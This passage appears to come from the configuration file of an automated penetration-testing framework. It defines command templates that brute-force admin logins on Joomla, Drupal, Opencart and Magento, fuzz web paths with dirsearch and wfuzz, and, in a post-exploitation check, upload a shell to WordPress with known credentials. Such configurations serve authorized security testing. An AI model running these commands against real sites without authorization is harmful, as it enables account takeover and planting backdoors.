context_1   = { 'web_cms': 'joomla', 'auth_type': 'joomla', 'auth_status': NO_AUTH }
command_2   = /bin/bash -c "rm /tmp/url.txt; echo [URL] >> /tmp/url.txt; perl XBruteForcer.pl -l /tmp/url.txt -p [PASSLIST default="passwords/pass-medium.txt"] <<< 2; rm /tmp/url.txt"; tput sgr0
context_2   = { 'web_cms': 'joomla', 'auth_type': 'joomla', 'auth_status': USER_ONLY }

[check_bruteforce-drupal]
name        = bruteforce-drupal
category    = bruteforce
description = Bruteforce Drupal "admin" account
tool        = xbruteforcer
command_1   = /bin/bash -c "rm /tmp/url.txt; echo [URL] >> /tmp/url.txt; perl XBruteForcer.pl -l /tmp/url.txt -p [PASSLIST default="passwords/pass-medium.txt"] <<< 3; rm /tmp/url.txt"; tput sgr0
context_1   = { 'web_cms': 'drupal', 'auth_type': 'drupal', 'auth_status': NO_AUTH }
command_2   = /bin/bash -c "rm /tmp/url.txt; echo [URL] >> /tmp/url.txt; perl XBruteForcer.pl -l /tmp/url.txt -p [PASSLIST default="passwords/pass-medium.txt"] <<< 3; rm /tmp/url.txt"; tput sgr0
context_2   = { 'web_cms': 'drupal', 'auth_type': 'drupal', 'auth_status': USER_ONLY }

[check_bruteforce-opencart]
name        = bruteforce-opencart
category    = bruteforce
description = Bruteforce Opencart "admin" account
tool        = xbruteforcer
command_1   = /bin/bash -c "rm /tmp/url.txt; echo [URL] >> /tmp/url.txt; perl XBruteForcer.pl -l /tmp/url.txt -p [PASSLIST default="passwords/pass-medium.txt"] <<< 4; rm /tmp/url.txt"; tput sgr0
context_1   = { 'web_cms': 'opencart', 'auth_type': 'opencart', 'auth_status': NO_AUTH }
command_2   = /bin/bash -c "rm /tmp/url.txt; echo [URL] >> /tmp/url.txt; perl XBruteForcer.pl -l /tmp/url.txt -p [WORDLISTSDIR]/passwords/pass-medium.txt <<< 4; rm /tmp/url.txt"; tput sgr0
context_2   = { 'web_cms': 'opencart', 'auth_type': 'opencart', 'auth_status': NO_AUTH }


[check_bruteforce-magento]
name        = bruteforce-magento
category    = bruteforce
description = Bruteforce Magento "admin" account
tool        = xbruteforcer
command_1   = /bin/bash -c "rm /tmp/url.txt; echo [URL] >> /tmp/url.txt; perl XBruteForcer.pl -l /tmp/url.txt -p [WORDLISTSDIR]/passwords/pass-medium.txt <<< 5; rm /tmp/url.txt"; tput sgr0
context_1   = { 'web_cms': 'magento', 'auth_type': 'magento', 'auth_status': NO_AUTH }
command_2   = /bin/bash -c "rm /tmp/url.txt; echo [URL] >> /tmp/url.txt; perl XBruteForcer.pl -l /tmp/url.txt -p [WORDLISTSDIR]/passwords/pass-medium.txt <<< 5; rm /tmp/url.txt"; tput sgr0
context_2   = { 'web_cms': 'magento', 'auth_type': 'magento', 'auth_status': USER_ONLY }

[check_web-path-bruteforce-targeted]
name        = web-path-bruteforce-targeted
category    = bruteforce
description = Bruteforce web paths when language is known (extensions adapted) (use raft wordlist)
tool        = dirsearch
command_1   = python3 dirsearch.py -u [URL] -e jsp,java,do,txt,html,log -w [WORDLISTSDIR]/services/http/discovery/raft-large-directories.txt -f --exclude-status=400,404,500,000
context_1   = { 'web-language': 'Java' }
command_2   = python3 dirsearch.py -u [URL] -e php,txt,html,log -w [WORDLISTSDIR]/services/http/discovery/raft-large-directories.txt -f --exclude-status=400,404,500,000
context_2   = { 'web-language': 'PHP' }
command_3   = python3 dirsearch.py -u [URL] -e asp,aspx,txt,html,log -w [WORDLISTSDIR]/services/http/discovery/raft-large-directories.txt -f --exclude-status=400,404,500,000
context_3   = { 'web-language': 'Microsoft/ASP.NET' }
command_4   = python3 dirsearch.py -u [URL] -e cfm,txt,html,log -w [WORDLISTSDIR]/services/http/discovery/raft-large-directories.txt -f --exclude-status=400,404,500,000
context_4   = { 'web-language': 'CFML' }

[check_web-path-bruteforce-blind]
name        = web-path-bruteforce-blind
category    = bruteforce
description = Bruteforce web paths when language is unknown (use raft wordlist)
tool        = wfuzz
command_1   = ./wfuzz -c -u [URL]/FUZZ -w [WORDLISTSDIR]/services/http/discovery/raft-large-files.txt --hc 400,404,500,000
context_1   = { 'web-language': 'undefined' }
command_2   = ./wfuzz -c -u [URL]/FUZZ/ -w [WORDLISTSDIR]/services/http/discovery/raft-large-directories.txt --hc 400,404,500,000
context_2   = { 'web-language': 'undefined' }

# [check_web-path-bruteforce-opendoor]
# name        = web-path-bruteforce-opendoor
# category    = bruteforce
# description = Bruteforce web paths using OWASP OpenDoor wordlist
# tool        = wfuzz
# command_1   = ./wfuzz -c -u [URL]/FUZZ -w [WORDLISTSDIR]/services/http/discovery/opendoor-paths.txt --hc 400,404,500,000


#########################################################################################
# Postexploit
#########################################################################################
[check_wordpress-shell-upload]
name        = wordpress-shell-upload
category    = postexploit
description = Upload shell on Wordpress if admin credentials are known
tool        = wpforce
command_1   = python2.7 yertle.py -u "[USERNAME]" -p "[PASSWORD]" -t [URL] -i
context_1   = { 'web-cms': 'Wordpress', 'auth_type': 'wordpress', 'auth_status': POST_AUTH }